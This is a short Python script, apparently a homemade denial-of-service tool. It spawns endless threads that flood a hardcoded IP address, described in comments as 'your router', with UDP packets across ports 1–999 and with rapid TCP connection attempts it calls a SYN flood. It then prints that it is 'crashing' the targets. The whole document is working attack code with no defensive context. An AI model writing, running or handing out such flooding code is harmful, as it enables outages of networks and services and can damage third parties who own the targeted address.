import socket
import threading

# Target both your router AND external IP twice
targets = [
    "62.109.121.43",  # Your router
    "62.109.121.43",  # Same IP again (double hit)
    "62.109.121.43"   # Third instance for triple power
]

packet_count = [0]

def attack_target(ip):
    while True:
        try:
            # UDP flood
            udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            for port in range(1, 1000):
                udp.sendto(b"X" * 1450, (ip, port))
                packet_count[0] += 1
            
            # SYN flood  
            syn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            syn.settimeout(0.001)
            for port in [80, 443, 53, 8080]:
                syn.connect_ex((ip, port))
                packet_count[0] += 1
            syn.close()
            udp.close()
        except:
            pass

# Launch attacks on all targets
for ip in targets:
    for _ in range(3):  # 3 threads per target
        threading.Thread(target=attack_target, args=(ip,), daemon=True).start()

print(f"Crashing {len(targets)} targets...")
while True:
    pass
